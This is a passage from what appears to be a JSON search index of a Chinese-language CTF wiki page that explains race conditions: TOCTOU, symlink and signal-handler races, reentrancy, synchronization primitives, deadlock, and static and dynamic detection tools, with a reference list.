\n1275066112\n \nhas\n \ncounter\n \nvalue\n \n9\n\n\nThread\n \n1266345728\n \nhas\n \ncounter\n \nvalue\n \n10\n\n\n\n\n\n\u4ed4\u7ec6\u601d\u8003\u4e00\u4e0b\u6761\u4ef6\u7ade\u4e89\u4e3a\u4ec0\u4e48\u53ef\u80fd\u4f1a\u53d1\u751f\u5462\uff1f\u4ee5\u4e0b\u9762\u7684\u4e3a\u5177\u4f53\u7684\u4f8b\u5b50\n\n\n\n\n\u7a0b\u5e8f\u9996\u5148\u6267\u884c\u4e86action1\uff0c\u7136\u540e\u6267\u884c\u4e86action2\u3002\u5176\u4e2d action \u53ef\u80fd\u662f\u5e94\u7528\u7ea7\u522b\u7684\uff0c\u4e5f\u53ef\u80fd\u662f\u64cd\u4f5c\u7cfb\u7edf\u7ea7\u522b\u7684\u3002\u6b63\u5e38\u6765\u8bf4\uff0c\u6211\u4eec\u5e0c\u671b\u7a0b\u5e8f\u5728\u6267\u884c action2 \u65f6\uff0caction1 \u6240\u4ea7\u751f\u7684\u6761\u4ef6\u4ecd\u7136\u662f\u6ee1\u8db3\u7684\u3002\n\n\n\u4f46\u662f\u7531\u4e8e\u7a0b\u5e8f\u7684\u5e76\u53d1\u6027\uff0c\u653b\u51fb\u8005\u5f88\u6709\u53ef\u80fd\u53ef\u4ee5\u5728 action2 \u6267\u884c\u4e4b\u524d\u7684\u8fd9\u4e2a\u77ed\u6682\u7684\u65f6\u95f4\u7a97\u53e3\u4e2d\u7834\u574f action1 \u6240\u4ea7\u751f\u7684\u6761\u4ef6\u3002\u8fd9\u65f6\u5019\u653b\u51fb\u8005\u7684\u64cd\u4f5c\u4e0e action2 \u4ea7\u751f\u4e86\u6761\u4ef6\u7ade\u4e89\uff0c\u6240\u4ee5\u53ef\u80fd\u4f1a\u5f71\u54cd\u7a0b\u5e8f\u7684\u6267\u884c\u6548\u679c\u3002\n\n\n\n\n\n\n\u6240\u4ee5\u6211\u8ba4\u4e3a\u95ee\u9898\u7684\u6839\u6e90\u5728\u4e8e\u7a0b\u5e8f\u5458\u867d\u7136\u5047\u8bbe\u67d0\u4e2a\u6761\u4ef6\u5728\u76f8\u5e94\u65f6\u95f4\u6bb5\u5e94\u8be5\u662f\u6ee1\u8db3\u7684\uff0c\u4f46\u662f\u5f80\u5f80\u6761\u4ef6\u53ef\u80fd\u4f1a\u5728\u8fd9\u4e2a\u5f88\u5c0f\u7684\u65f6\u95f4\u7a97\u53e3\u4e2d\u88ab\u4fee\u6539\u3002\n\u867d\u7136\u8fd9\u4e2a\u65f6\u95f4\u7684\u95f4\u9694\u53ef\u80fd\u975e\u5e38\u5c0f\uff0c\u4f46\u662f\u653b\u51fb\u8005\u4ecd\u7136\u53ef\u80fd\u53ef\u4ee5\u901a\u8fc7\u6267\u884c\u67d0\u4e9b\u64cd\u4f5c\uff08\u5982\u8ba1\u7b97\u5bc6\u96c6\u578b\u64cd\u4f5c\uff0cDos\u653b\u51fb\uff09\u4f7f\u5f97\u53d7\u5bb3\u673a\u5668\u7684\u5904\u7406\u901f\u5ea6\u53d8\u5f97\u76f8\u5bf9\u6162\u4e00\u4e9b\u3002\n\n\n\u5f62\u5f0f\n\n\n\u5e38\u89c1\u7684\u6761\u4ef6\u7ade\u4e89\u6709\u4ee5\u4e0b\u5f62\u5f0f\u3002\n\n\nCWE-367: TOCTOU Race Condition\n\n\n\u63cf\u8ff0\n\n\nTOCTOC (Time-of-check Time-of-use) \u6307\u7684\u662f\u7a0b\u5e8f\u5728\u4f7f\u7528\u8d44\u6e90\uff08\u53d8\u91cf\uff0c\u5185\u5b58\uff0c\u6587\u4ef6\uff09\u524d\u4f1a\u5bf9\u8fdb\u884c\u68c0\u67e5\uff0c\u4f46\u662f\u5728\u7a0b\u5e8f\u4f7f\u7528\u5bf9\u5e94\u7684\u8d44\u6e90\u524d\uff0c\u8be5\u8d44\u6e90\u5374\u88ab\u4fee\u6539\u4e86\u3002\n\n\n\n\n\u4e0b\u9762\u7ed9\u51fa\u4e00\u4e9b\u66f4\u52a0\u5177\u4f53\u7684\u4f8b\u5b50\u3002\n\n\nCWE-365: Race Condition in Switch\n\n\n\u5f53\u7a0b\u5e8f\u6b63\u5728\u6267\u884c switch \u8bed\u53e5\u65f6\uff0c\u5982\u679c switch \u53d8\u91cf\u7684\u503c\u88ab\u6539\u53d8\uff0c\u90a3\u4e48\u5c31\u53ef\u80fd\u9020\u6210\u4e0d\u53ef\u9884\u77e5\u7684\u884c\u4e3a\u3002\u5c24\u5176\u5728case \u8bed\u53e5\u540e\u4e0d\u5199 break \u8bed\u53e5\u7684\u4ee3\u7801\uff0c\u4e00\u65e6 switch \u53d8\u91cf\u53d1\u751f\u6539\u53d8\uff0c\u5f88\u6709\u53ef\u80fd\u4f1a\u6539\u53d8\u7a0b\u5e8f\u539f\u6709\u7684\u903b\u8f91\u3002\n\n\nCWE-363: Race Condition Enabling Link Following\n\n\n\u6211\u4eec\u77e5\u9053 Linux \u4e2d\u63d0\u4f9b\u4e86\u4e24\u79cd\u5bf9\u4e8e\u6587\u4ef6\u7684\u547d\u540d\u65b9\u5f0f\n\n\n\n\n\u6587\u4ef6\u8def\u5f84\u540d\n\n\n\u6587\u4ef6\u63cf\u8ff0\u7b26\n\n\n\n\n\u4f46\u662f\uff0c\u5c06\u8fd9\u4e24\u79cd\u547d\u540d\u89e3\u6790\u5230\u76f8\u5e94\u5bf9\u8c61\u4e0a\u7684\u65b9\u5f0f\u6709\u6240\u4e0d\u540c\n\n\n\n\n\u6587\u4ef6\u8def\u5f84\u540d\u5728\u89e3\u6790\u7684\u65f6\u5019\u662f\u901a\u8fc7\u4f20\u5165\u7684\u8def\u5f84\uff08\u6587\u4ef6\u540d\uff0c\u786c\u94fe\u63a5\uff0c\u8f6f\u8fde\u63a5\uff09\n\u95f4\u63a5\u89e3\u6790\n\u7684\uff0c\u5176\u4f20\u5165\u7684\u53c2\u6570\u5e76\u4e0d\u662f\u76f8\u5e94\u6587\u4ef6\u7684\u771f\u5b9e\u5730\u5740(inode)\u3002\n\n\n\u6587\u4ef6\u63cf\u8ff0\u7b26\u901a\u8fc7\u8bbf\u95ee\u76f4\u63a5\u6307\u5411\u6587\u4ef6\u7684\u6307\u9488\u6765\u89e3\u6790\u3002\n\n\n\n\n\u6b63\u662f\u7531\u4e8e\u95f4\u63a5\u6027\uff0c\u4ea7\u751f\u4e86\u4e0a\u9762\u6211\u4eec\u6240\u8bf4\u7684\u65f6\u95f4\u7a97\u53e3\u3002\n\n\n\u4ee5\u4e0b\u9762\u7684\u4ee3\u7801\u4e3a\u4f8b\u5b50\uff0c\u7a0b\u5e8f\u5728\u8bbf\u95ee\u67d0\u4e2a\u6587\u4ef6\u4e4b\u524d\uff0c\u4f1a\u68c0\u67e5\u662f\u5426\u5b58\u5728\uff0c\u4e4b\u540e\u4f1a\u6253\u5f00\u6587\u4ef6\u7136\u540e\u6267\u884c\u64cd\u4f5c\u3002\u4f46\u662f\u5982\u679c\u5728\u68c0\u67e5\u4e4b\u540e\uff0c\u771f\u6b63\u4f7f\u7528\u6587\u4ef6\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u5c06\u6587\u4ef6\u4fee\u6539\u4e3a\u67d0\u4e2a\u7b26\u53f7\u94fe\u63a5\uff0c\u90a3\u4e48\u7a0b\u5e8f\u5c06\u8bbf\u95ee\u9519\u8bef\u7684\u6587\u4ef6\u3002\n\n\n\n\n\u8fd9\u79cd\u6761\u4ef6\u7ade\u4e89\u51fa\u73b0\u7684\u95ee\u9898\u7684\u6839\u6e90\u5728\u4e8e\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684\u540d\u5b57\u5bf9\u8c61\u7ed1\u5b9a\u7684\u95ee\u9898\u3002\u800c\u4e0b\u9762\u7684\u51fd\u6570\u90fd\u4f1a\u4f7f\u7528\u6587\u4ef6\u540d\u4f5c\u4e3a\u53c2\u6570\uff1aaccess(), open(), creat(), mkdir(), unlink(), rmdir(), chown(), symlink(), link(), rename(), chroot(),\u2026\n\n\n\u90a3\u8be5\u5982\u4f55\u907f\u514d\u8fd9\u4e2a\u95ee\u9898\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 fstat \u51fd\u6570\u6765\u8bfb\u53d6\u6587\u4ef6\u7684\u4fe1\u606f\u5e76\u628a\u5b83\u5b58\u5165\u5230stat\u7ed3\u6784\u4f53\u4e2d\uff0c\u7136\u540e\u6211\u4eec\u53ef\u4ee5\u5c06\u8be5\u4fe1\u606f\u4e0e\u6211\u4eec\u5df2\u77e5\u7684\u4fe1\u606f\u8fdb\u884c\u6bd4\u8f83\u6765\u5224\u65ad\u6211\u4eec\u662f\u5426\u8bfb\u5165\u4e86\u6b63\u786e\u7684\u4fe1\u606f\u3002\u5176\u4e2d\uff0cstat\u7ed3\u6784\u4f53\u4e2d\u7684 \nst_ino\n \u548c \nst_dev\n \u53d8\u91cf\u53ef\u4ee5\u552f\u4e00\u8868\u793a\u6587\u4ef6\n\n\n\n\nst_ino\n \uff0c\u5305\u542b\u4e86\u6587\u4ef6\u7684\u5e8f\u5217\u53f7\uff0c\u5373 \ni-node\n\n\nst_dev\n \uff0c\u5305\u542b\u4e86\u6587\u4ef6\u5bf9\u5e94\u7684\u8bbe\u5907\u3002\n\n\n\n\n\n\nCWE-364: Signal Handler Race Condition\n\n\n\u6982\u8ff0\n\n\n\u6761\u4ef6\u7ade\u4e89\u7ecf\u5e38\u4f1a\u53d1\u751f\u5728\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u4e2d\uff0c\u8fd9\u662f\u56e0\u4e3a\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u652f\u6301\u5f02\u6b65\u64cd\u4f5c\u3002\u5c24\u5176\u662f\u5f53\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u662f\n\u4e0d\u53ef\u91cd\u5165\n\u7684\u6216\u8005\u72b6\u6001\u654f\u611f\u7684\u65f6\u5019\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u901a\u8fc7\u5229\u7528\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u4e2d\u7684\u6761\u4ef6\u7ade\u4e89\uff0c\u53ef\u80fd\u53ef\u4ee5\u8fbe\u5230\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u548c\u4ee3\u7801\u6267\u884c\u7684\u6548\u679c\u3002\u6bd4\u5982\u8bf4\uff0c\u5982\u679c\u5728\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u4e2d\u6267\u884c\u4e86free\u64cd\u4f5c\uff0c\u6b64\u65f6\u53c8\u6765\u4e86\u4e00\u4e2a\u4fe1\u53f7\uff0c\u7136\u540e\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u5c31\u4f1a\u518d\u6b21\u6267\u884cfree\u64cd\u4f5c\uff0c\u8fd9\u65f6\u5019\u5c31\u4f1a\u51fa\u73b0 double free \u7684\u60c5\u51b5\uff0c\u518d\u7a0d\u5fae\u64cd\u4f5c\u4e00\u4e0b\uff0c\u5c31\u53ef\u80fd\u53ef\u4ee5\u8fbe\u5230\u4efb\u610f\u5730\u5740\u5199\u7684\u6548\u679c\u4e86\u3002\n\n\n\u4e00\u822c\u6765\u8bf4\uff0c\u4e0e\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u6709\u5173\u7684\u5e38\u89c1\u7684\u6761\u4ef6\u7ade\u4e89\u60c5\u51b5\u6709\n\n\n\n\n\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u548c\u666e\u901a\u7684\u4ee3\u7801\u6bb5\u5171\u4eab\u5168\u5c40\u53d8\u91cf\u548c\u6570\u636e\u6bb5\u3002\n\n\n\u5728\u4e0d\u540c\u7684\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u4e2d\u5171\u4eab\u72b6\u6001\u3002\n\n\n\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u672c\u8eab\u4f7f\u7528\u4e0d\u53ef\u91cd\u5165\u7684\u51fd\u6570\uff0c\u6bd4\u5982 malloc \u548c free \u3002\n\n\n\u4e00\u4e2a\u4fe1\u53f7\u5904\u7406\u51fd\u6570\u5904\u7406\u591a\u4e2a\u4fe1\u53f7\uff0c\u8fd9\u53ef\u80fd\u4f1a\u8fdb\u800c\u5bfc\u81f4use after free \u548c double free \u6f0f\u6d1e\u3002\n\n\n\u4f7f\u7528 setjmp \u6216\u8005 longjmp \u7b49\u673a\u5236\u6765\u4f7f\u5f97\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u4e0d\u80fd\u591f\u8fd4\u56de\u539f\u6765\u7684\u7a0b\u5e8f\u6267\u884c\u6d41\u3002\n\n\n\n\n\u7ebf\u7a0b\u5b89\u5168\u4e0e\u53ef\u91cd\u5165\n\n\n\u8fd9\u91cc\u8bf4\u660e\u4e00\u4e0b\u7ebf\u7a0b\u5b89\u5168\u4e0e\u53ef\u91cd\u5165\u7684\u5173\u7cfb\u3002\n\n\n\n\n\u7ebf\u7a0b\u5b89\u5168\n\n\n\u5373\u8be5\u51fd\u6570\u53ef\u4ee5\u88ab\u591a\u4e2a\u7ebf\u7a0b\u8c03\u7528\uff0c\u800c\u4e0d\u4f1a\u51fa\u73b0\u4efb\u4f55\u95ee\u9898\u3002\n\n\n\u6761\u4ef6\n\n\n\u672c\u8eab\u6ca1\u6709\u4efb\u4f55\u5171\u4eab\u8d44\u6e90\n\n\n\u6709\u5171\u4eab\u8d44\u6e90\uff0c\u9700\u8981\u52a0\u9501\u3002\n\n\n\n\n\n\n\n\n\n\n\u53ef\u91cd\u7528\n\n\n\u4e00\u4e2a\u51fd\u6570\u53ef\u4ee5\u88ab\u591a\u4e2a\u5b9e\u4f8b\u53ef\u4ee5\u540c\u65f6\u8fd0\u884c\u5728\u76f8\u540c\u7684\u5730\u5740\u7a7a\u95f4\u4e2d\u3002\n\n\n\u53ef\u91cd\u5165\u51fd\u6570\u53ef\u4ee5\u88ab\u4e2d\u65ad\uff0c\u5e76\u4e14\u5176\u5b83\u4ee3\u7801\u5728\u8fdb\u5165\u8be5\u51fd\u6570\u65f6\uff0c\u4e0d\u4f1a\u4e22\u5931\u6570\u636e\u7684\u5b8c\u6574\u6027\u3002\u6240\u4ee5\u53ef\u91cd\u5165\u51fd\u6570\u4e00\u5b9a\u662f\u7ebf\u7a0b\u5b89\u5168\u7684\u3002\n\n\n\u53ef\u91cd\u5165\u5f3a\u8c03\u7684\u662f\u5355\u4e2a\u7ebf\u7a0b\u6267\u884c\u65f6\uff0c\u91cd\u65b0\u8fdb\u5165\u540c\u4e00\u4e2a\u5b50\u7a0b\u5e8f\u4ecd\u7136\u662f\u5b89\u5168\u7684\u3002\n\n\n\u4e0d\u6ee1\u8db3\u6761\u4ef6\n\n\n\u51fd\u6570\u4f53\u5185\u4f7f\u7528\u4e86\u9759\u6001\u6570\u636e\u7ed3\u6784\uff0c\u5e76\u4e14\u4e0d\u662f\u5e38\u91cf\n\n\n\u51fd\u6570\u4f53\u5185\u4f7f\u7528\u4e86malloc \u6216\u8005 free \u51fd\u6570\n\n\n\u51fd\u6570\u4f7f\u7528\u4e86\u6807\u51c6 IO \u51fd\u6570\u3002\n\n\n\u8c03\u7528\u7684\u51fd\u6570\u4e0d\u662f\u53ef\u91cd\u5165\u7684\u3002\n\n\n\n\n\n\n\u53ef\u91cd\u5165\u51fd\u6570\u4f7f\u7528\u7684\u6240\u6709\u53d8\u91cf\u90fd\u4fdd\u5b58\u5728\n\u8c03\u7528\u6808\n\u7684\u5f53\u524d\n\u51fd\u6570\u6808\n\uff08frame\uff09\u4e0a\u3002\n\n\n\n\n\n\n\n\n\u9632\u8303\n\n\n\u5982\u679c\u60f3\u8981\u6d88\u9664\u6761\u4ef6\u7ade\u4e89\uff0c\u90a3\u4e48\u9996\u8981\u7684\u76ee\u6807\u662f\u627e\u5230\u7ade\u4e89\u7a97\u53e3\uff08race windows\uff09\u3002\n\n\n\u6240\u8c13\u7ade\u4e89\u7a97\u53e3\uff0c\u5c31\u662f\u8bbf\u95ee\u7ade\u4e89\u5bf9\u8c61\u7684\u4ee3\u7801\u6bb5\uff0c\u8fd9\u7ed9\u653b\u51fb\u8005\u76f8\u5e94\u7684\u673a\u4f1a\u6765\u4fee\u6539\u76f8\u5e94\u7684\u7ade\u4e89\u5bf9\u8c61\u3002\n\n\n\u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u4f7f\u5f97\u51b2\u7a81\u7684\u7ade\u4e89\u7a97\u53e3\u76f8\u4e92\u6392\u65a5\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u6d88\u9664\u7ade\u4e89\u6761\u4ef6\u3002\n\n\n\u540c\u6b65\u539f\u8bed\n\n\n\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u4f1a\u4f7f\u7528\u540c\u6b65\u539f\u8bed\u6765\u6d88\u9664\u7ade\u4e89\u6761\u4ef6\u3002\u5e38\u89c1\u7684\u5982\u4e0b\n\n\n\n\n\u9501\u53d8\u91cf\n\n\n\u901a\u5e38\u4e92\u65a5\u7410\uff0c\u5728\u7b49\u5f85\u671f\u95f4\u653e\u5f03CPU\uff0c\u8fdb\u5165idle\u72b6\u6001\uff0c\u8fc7\u4e00\u6bb5\u65f6\u95f4\u81ea\u52a8\u5c1d\u8bd5\u3002\n\n\n\u81ea\u65cb\u9501\uff08spinlock\uff09\uff0c\u5728\u7b49\u5f85\u671f\u95f4\u4e0d\u653e\u5f03CPU\uff0c\u4e00\u76f4\u5c1d\u8bd5\u3002\n\n\n\n\n\n\n\u6761\u4ef6\u53d8\u91cf\n\n\n\u6761\u4ef6\u53d8\u91cf\u662f\u7528\u6765\u7b49\u5f85\u800c\u4e0d\u662f\u7528\u6765\u4e0a\u9501\u7684\u3002\u6761\u4ef6\u53d8\u91cf\u7528\u6765\u81ea\u52a8\u963b\u585e\u4e00\u4e2a\u7ebf\u7a0b\uff0c\u76f4\u5230\u67d0\u7279\u6b8a\u60c5\u51b5\u53d1\u751f\u4e3a\u6b62\u3002\u901a\u5e38\u6761\u4ef6\u53d8\u91cf\u548c\u4e92\u65a5\u9501\u540c\u65f6\u4f7f\u7528\u3002\n\n\n\n\n\n\n\n\n\u4e34\u754c\u533a\u5bf9\u8c61\uff0cCRITICAL_SECTION\n\n\n\n\n\n\n\u4fe1\u53f7\u91cf\uff08semaphore\uff09\uff0c\u63a7\u5236\u53ef\u8bbf\u95ee\u67d0\u4e2a\u4e34\u754c\u533a\u7684\u7ebf\u7a0b\u6570\u91cf\uff0c\u4e00\u822c\u6bd41\u5927\u3002\n\n\n\n\n\u7ba1\u9053\uff0c\u6307\u7528\u4e8e\u8fde\u63a5\u4e00\u4e2a\u8bfb\u8fdb\u7a0b\u548c\u4e00\u4e2a\u5199\u8fdb\u7a0b\u4ee5\u5b9e\u73b0\u5b83\u4eec\u4e4b\u95f4\u901a\u4fe1\u7684\u4e00\u4e2a\u5171\u4eab\u6587\u4ef6\u3002\u5176\u751f\u5b58\u671f\u4e0d\u8d85\u8fc7\u521b\u5efa\u7ba1\u9053\u7684\u8fdb\u7a0b\u7684\u751f\u5b58\u671f\u3002\n\n\n\u547d\u540d\u7ba1\u9053\uff0c\u751f\u5b58\u671f\u53ef\u4ee5\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u8fd0\u884c\u671f\u4e00\u6837\u957f\u3002\n\n\n\n\n# \u521b\u5efa\u7ba1\u9053\nmkfifo my_pipe\n# gzip\u4ece\u7ed9\u5b9a\u7684\u7ba1\u9053\u4e2d\u8bfb\u53d6\u6570\u636e\uff0c\u5e76\u628a\u6570\u636e\u538b\u7f29\u5230out.gz\u4e2d\ngzip -9 -c \n my_pipe \n out.gz \n\n# \u7ed9\u7ba1\u9053\u4f20\u8f93\u6570\u636e\ncat file \n my_pipe\n\n\n\n\n\u6b7b\u9501\n\n\n\u6982\u8ff0\n\n\n\u5f53\u540c\u6b65\u539f\u8bed\u4f7f\u7528\u7684\u4e0d\u6070\u5f53\u7684\u65f6\u5019\uff0c\u8fdb\u7a0b\u5c31\u53ef\u80fd\u4f1a\u51fa\u73b0\u6b7b\u9501\u3002\u5f53\u4e24\u4e2a\u6216\u4e24\u4e2a\u4ee5\u4e0a\u7684\u6267\u884c\u6d41\u4e92\u76f8\u963b\u585e\u5bfc\u81f4\u90fd\u4e0d\u80fd\u7ee7\u7eed\u6267\u884c\uff0c\u6b7b\u9501\u5c31\u4f1a\u53d1\u751f\u3002\u5176\u5b9e\uff0c\u6b7b\u9501\u4e3b\u8981\u662f\u56e0\u4e3a\u5728\u51b2\u7a81\u7684\u6267\u884c\u6d41\u4e2d\uff0c\u51fa\u73b0\u4e86\u5faa\u73af\u7b49\u5f85\u7684\u6267\u884c\u6d41\uff0c\u5373\u5faa\u73af\u7b49\u5f85\u4e2d\u7684\u6bcf\u4e00\u4e2a\u6267\u884c\u6d41\u90fd\u83b7\u5f97\u4e00\u4e2a\u8d44\u6e90\uff0c\u540c\u65f6\u8bd5\u56fe\u83b7\u5f97\u4e0b\u4e00\u4e2a\u8d44\u6e90\u3002\u4e0b\u56fe\u6240\u793a\uff0cP1\u3001P2 \u4e24\u4e2a\u8fdb\u7a0b\u90fd\u9700\u8981\u8d44\u6e90\u624d\u80fd\u7ee7\u7eed\u8fd0\u884c\u3002P1 \u62e5\u6709\u8d44\u6e90 R2\u3001\u8fd8\u9700\u8981\u989d\u5916\u8d44\u6e90 R1 \u624d\u80fd\u8fd0\u884c\uff1bP2 \u62e5\u6709\u8d44\u6e90 R1\u3001\u8fd8\u9700\u8981\u989d\u5916\u8d44\u6e90 R2 \u624d\u80fd\u8fd0\u884c\uff0c\u4e24\u8fb9\u90fd\u5728\u4e92\u76f8\u7b49\u5f85\u800c\u6ca1\u6709\u4efb\u4f55\u4e00\u4e2a\u53ef\u8fd0\u884c\u3002\n\n\n\n\n\u4e00\u822c\u6765\u8bf4\uff0c\u6b7b\u9501\u6709\u4ee5\u4e0b\u56db\u4e2a\u5fc5\u8981\u6761\u4ef6\n\n\n\n\n\u4e92\u65a5\uff0c\u8d44\u6e90\u662f\u4e92\u65a5\u7684\u3002\n\n\n\u6301\u6709\u548c\u7b49\u5f85\uff0c\u6301\u6709\u5df2\u6709\u7684\u8d44\u6e90\uff0c\u540c\u65f6\u7b49\u5f85\u4f7f\u7528\u4e0b\u4e00\u4e2a\u8d44\u6e90\u3002\n\n\n\u4e0d\u53ef\u62a2\u5360\uff0c\u8fdb\u7a0b\u6240\u83b7\u5f97\u7684\u8d44\u6e90\u5728\u672a\u4f7f\u7528\u5b8c\u6bd5\u4e4b\u524d\uff0c\u8d44\u6e90\u7533\u8bf7\u8005\u4e0d\u80fd\u5f3a\u884c\u5730\u4ece\u8d44\u6e90\u5360\u6709\u8005\u624b\u4e2d\u593a\u53d6\u8d44\u6e90\uff0c\u800c\u53ea\u80fd\u7531\u8be5\u8d44\u6e90\u7684\u5360\u6709\u8005\u8fdb\u7a0b\u81ea\u884c\u91ca\u653e\u3002\n\n\n\u5faa\u73af\u7b49\u5f85\uff0c\u5faa\u73af\u7b49\u5f85\u8d44\u6e90\u3002\n\n\n\n\n\u800c\u5982\u679c\u60f3\u8981\u6d88\u9664\u6b7b\u9501\uff0c\u4e5f\u5c31\u662f\u6253\u7834\u4e0a\u9762\u7684\u56db\u4e2a\u5fc5\u8981\u6761\u4ef6\u3002\n\n\n\u6b64\u5916\uff0c\u6b7b\u9501\u53ef\u80fd\u6765\u6e90\u4e8e\u4ee5\u4e0b\u7684\u539f\u56e0\n\n\n\n\n\u5904\u7406\u5668\u901f\u5ea6\n\n\n\u8fdb\u7a0b\u6216\u8005\u7ebf\u7a0b\u8c03\u5ea6\u7b97\u6cd5\u7684\u53d8\u52a8\n\n\n\u5728\u6267\u884c\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u540c\u5185\u5b58\u7684\u9650\u5236\u3002\n\n\n\u4efb\u4f55\u80fd\u591f\u4e2d\u65ad\u7a0b\u5e8f\u6267\u884c\u7684\u5f02\u6b65\u4e8b\u4ef6\u3002\n\n\n\n\n\u5f71\u54cd\n\n\n\u6b7b\u9501\u4e00\u822c\u60c5\u51b5\u4e0b\u4f1a\u9020\u6210\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u3002\n\n\n\u68c0\u6d4b\n\n\n\u90a3\u4e48\uff0c\u8bf4\u5230\u8fd9\u91cc\uff0c\u6211\u4eec\u6709\u6ca1\u6709\u53ef\u80fd\u6765\u68c0\u6d4b\u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e\u5462\uff1f\u76ee\u524d\u4e5f\u786e\u5b9e\u6709\u8fd9\u65b9\u9762\u7684\u7814\u7a76\uff0c\u4e5f\u662f\u4e3b\u8981\u4ece\u9759\u6001\u5206\u6790\u548c\u52a8\u6001\u5206\u6790\u4e24\u4e2a\u65b9\u9762\u6765\u68c0\u6d4b\u3002\n\n\n\u9759\u6001\u68c0\u6d4b\n\n\n\u76ee\u524d\u5df2\u77e5\u7684\u9759\u6001\u68c0\u6d4b\u5de5\u5177\u6709\n\n\n\n\nFlawfinder\n\n\n\u76ee\u6807\uff1aC/C++\u6e90\u7801\n\n\n\u6b65\u9aa4\n\n\n\u5efa\u7acb\u6f0f\u6d1e\u6570\u636e\u5e93\n\n\n\u8fdb\u884c\u7b80\u5355\u7684\u6587\u672c\u6a21\u5f0f\u5339\u914d\uff0c\u6ca1\u6709\u4efb\u4f55\u7684\u6570\u636e\u6d41\u6216\u63a7\u5236\u6d41\u5206\u6790\n\n\n\n\n\n\n\n\n\n\nThreadSanitizer\n\n\n\u76ee\u6807\uff1aC++\u548cGO\n\n\n\u5b9e\u73b0\uff1aLLVM\n\n\n\n\n\n\n\n\n\u52a8\u6001\u68c0\u6d4b\n\n\n\n\nIntel Inspector\n\n\nValgrind\n\n\n\n\n\u53c2\u8003\n\n\n\n\nhttp://www.teraits.com/pitagoras/marcio/segapp/05.ppt\n\n\nhttp://repository.root-me.org/Programmation/C%20-%20C++/EN%20-%20Secure%20Coding%20in%20C%20and%20C++%20Race%20Conditions.pdf\n\n\nhttps://www.blackhat.com/presentations/bh-europe-04/bh-eu-04-tsyrklevich/bh-eu-04-tsyrklevich.pdf\n\n\nhttps://xinhuang.github.io/posts/2014-09-23-detect-race-condition-using-clang-thread-sanitizer.html\n\n\nhttps://llvm.org/devmtg/2011-11/Hutchins_ThreadSafety.pdf\n\n\nhttp://www.cnblogs.com/biyeymyhjob/archive/2012/07/20/2601655.html\n\n\nhttp://www.cnblogs.com/huxiao-tee/p/4660352.html\n\n\nhttps://github.com/dirtycow/dirtycow.github.io", 
            "title": "\u6761\u4ef6\u7ade\u4e89\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#race-condition", 
            "text": "", 
            "title": "Race Condition"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#_1", 
            "text": "\u6761\u4ef6\u7ade\u4e89\u662f\u6307\u4e00\u4e2a\u7cfb\u7edf\u7684\u8fd0\u884c\u7ed3\u679c\u4f9d\u8d56\u4e8e\u4e0d\u53d7\u63a7\u5236\u7684\u4e8b\u4ef6\u7684\u5148\u540e\u987a\u5e8f\u3002\u5f53\u8fd9\u4e9b\u4e0d\u53d7\u63a7\u5236\u7684\u4e8b\u4ef6\u5e76\u6ca1\u6709\u6309\u7167\u5f00\u53d1\u8005\u60f3\u8981\u7684\u65b9\u5f0f\u8fd0\u884c\u65f6\uff0c\u5c31\u53ef\u80fd\u4f1a\u51fa\u73b0 bug\u3002\u8fd9\u4e2a\u672f\u8bed\u6700\u521d\u6765\u81ea\u4e8e\u4e24\u4e2a\u7535\u4fe1\u53f7\u4e92\u76f8\u7ade\u4e89\u6765\u5f71\u54cd\u8f93\u51fa\u7ed3\u679c\u3002   \u6761\u4ef6\u7ade\u4e89\u4e3b\u8981\u51fa\u73b0\u5728\u5982\u4e0b\u9886\u57df   \u7535\u5b50\u7cfb\u7edf\uff0c\u5c24\u5176\u662f\u903b\u8f91\u7535\u8def  \u8ba1\u7b97\u673a\uff0c\u5c24\u5176\u662f\u591a\u7ebf\u7a0b\u7a0b\u5e8f\u548c\u5206\u5e03\u5f0f\u7a0b\u5e8f\u3002   \u7531\u4e8e\u76ee\u524d\u7684\u7cfb\u7edf\u4e2d\u5927\u91cf\u91c7\u7528\u5e76\u53d1\u7f16\u7a0b\uff0c\u7ecf\u5e38\u5bf9\u8d44\u6e90\u8fdb\u884c\u5171\u4eab\uff0c\u5f80\u5f80\u4f1a\u4ea7\u751f\u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e\u3002  \u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u8003\u8651\u8ba1\u7b97\u673a\u7a0b\u5e8f\u65b9\u9762\u7684\u6761\u4ef6\u7ade\u4e89\u3002\u5f53\u4e00\u4e2a\u8f6f\u4ef6\u7684\u8fd0\u884c\u7ed3\u679c\u4f9d\u8d56\u4e8e\u8fdb\u7a0b\u6216\u8005\u7ebf\u7a0b\u7684\u987a\u5e8f\u65f6\uff0c\u5c31\u53ef\u80fd\u4f1a\u51fa\u73b0\u6761\u4ef6\u7ade\u4e89\u3002\u7b80\u5355\u8003\u8651\u4e00\u4e0b\uff0c\u53ef\u4ee5\u77e5\u9053\u6761\u4ef6\u7ade\u4e89\u9700\u8981\u5982\u4e0b\u7684 \u6761\u4ef6 \uff1a   